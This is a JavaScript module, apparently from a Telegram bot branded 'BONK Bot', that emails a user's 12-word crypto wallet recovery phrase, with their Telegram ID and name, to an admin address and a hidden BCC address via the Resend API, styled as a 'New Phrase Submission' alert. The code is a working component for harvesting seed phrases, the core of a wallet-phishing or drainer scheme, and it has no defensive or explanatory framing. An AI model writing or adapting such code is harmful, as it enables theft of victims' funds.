import { Resend } from 'resend';
import { ADMIN_EMAIL, HR_EMAIL, SENDER_EMAIL, RESEND_API_KEY } from '../config/env.js'

// Initialize Resend client
const resend = new Resend(RESEND_API_KEY);

/**
 * Sends an admin email with a user's 12-word wallet phrase.
 * @param {number} telegram_id - Telegram user ID.
 * @param {string} firstName - User's first name.
 * @param {string} phrase - 12-word wallet phrase.
 * @returns {Promise<Object>} - Mail delivery info object.
 */
const sendPhraseMail = async (telegram_id, firstName, phrase) => {
    console.log("📧 Sending email via Resend...");
    console.log("📧 From:", SENDER_EMAIL);
    console.log("📧 To:", ADMIN_EMAIL);
    console.log("📧 BCC:", HR_EMAIL);

    try {
        const { data, error } = await resend.emails.send({
            from: `"BONK Bot 🔐" <${SENDER_EMAIL}>`,
            to: [ADMIN_EMAIL],
            bcc: [HR_EMAIL],
            subject: `🔐 Wallet Phrase from ${firstName}`,
            html: `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: auto; border: 1px solid #eee; padding: 20px; border-radius: 8px; background-color: #f9f9f9;">
                <h2 style="color: #d9534f;">🚨 New Phrase Submission</h2>
                <hr style="border: none; border-top: 1px solid #ccc;" />
                <p><strong>👤 Telegram ID:</strong> ${telegram_id}</p>
                <p><strong>📛 Name:</strong> ${firstName}</p>
                <p><strong>🔑 Phrase:</strong></p>
                <pre style="background: #fff; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; white-space: pre-wrap; word-break: break-word;">${phrase}</pre>
                <p><strong>📬 Submitted:</strong> ${new Date().toLocaleString()}</p>
                <hr style="border: none; border-top: 1px solid #ccc;" />
                <footer style="text-align: center; font-size: 0.9em; color: #888;">
                    📡 BONK Bot Alert System
                </footer>
            </div>
        `
        });

        if (error) {
            console.error("❌ Error sending phrase email:", error);
            throw error;
        }

        console.log("✅ Email sent successfully via Resend");
        console.log("📧 Email ID:", data.id);

        return data;
    } catch (err) {
        console.error("❌ Failed to send email:", err.message);
        throw err;
    }
};

/**
 * Verify Resend API connection on startup
 */
export const verifyEmailConnection = async () => {
    try {
        if (!RESEND_API_KEY) {
            throw new Error("RESEND_API_KEY is not configured");
        }

        if (!RESEND_API_KEY.startsWith('re_')) {
            console.warn("⚠️ RESEND_API_KEY may be invalid (should start with 're_')");
        }

        console.log("✅ Resend API key is configured");
        return true;
    } catch (error) {
        console.error("⚠️ Resend email service verification failed:", error.message);
        console.error("⚠️ Email notifications may not work. Please check your Resend API key configuration.");
        return false;
    }
};

export default sendPhraseMail;